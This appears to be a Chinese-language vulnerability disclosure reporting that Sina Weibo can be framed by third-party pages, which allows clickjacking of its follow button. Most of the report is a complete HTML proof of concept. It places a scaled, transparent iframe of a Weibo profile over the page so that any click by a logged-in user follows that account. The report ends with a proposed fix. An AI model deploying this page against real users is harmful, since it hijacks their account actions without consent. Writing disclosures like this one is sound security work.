简要描述：

新浪微博加粉可点击劫持

详细说明：

新浪微博允许被第三方页面嵌套iframe。



可以构造一个透明iframe，尺寸偏移与关注按钮相同，缩放iframe与页面大小相同。



用户如果已登录微博，点击该页面的任意位置即可加关注。



<!doctype html>

<html>

	<head>

		<meta charset="utf-8" />

		<title>Weibo Click Hijack</title>

		<style>

		div {

			position: absolute;

			width: 58px;

			height: 25px;

			overflow: hidden;

			-webkit-transform: scale(10);

			-webkit-transform-origin: 0 0;

		}



		iframe {

			position: absolute;

			left: -227px;

			top: -442px;

			width: 800px;

			height: 580px;

			opacity: 0;

		}

		</style>

	</head>

	<body>

		<div>

			<iframe src="http://weibo.com/jshack"></iframe>

		</div>

	</body>

</html>

漏洞证明：





修复方案：

嵌套状态下不允许加关注等操作
